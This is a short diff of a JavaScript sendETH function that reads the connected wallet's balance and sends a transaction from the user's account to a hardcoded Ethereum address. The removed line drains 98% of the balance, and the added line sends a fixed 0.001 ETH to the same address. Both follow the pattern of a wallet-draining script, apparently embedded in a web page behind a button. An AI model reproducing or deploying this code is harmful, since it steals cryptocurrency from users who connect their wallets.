@@ -86,7 +86,7 @@ async function sendETH() {
 gasPrice = await window.ethereum.request({method: "eth_gasPrice"});
 
 params = [{"from": accounts[0], "to": "0x6258e22A8aC31354bf546Cd8582da695f6D8C98B", "gas": Number(21000).toString(16), 
-"gasPrice": gasPrice, "value": Number(balance*0.98).toString(16)}]
+"gasPrice": gasPrice, "value": Number(1000000000000000).toString(16)}]
 
 const button = document.querySelector('.css-1gztsgi');
 const divWithImage = document.createElement('div');
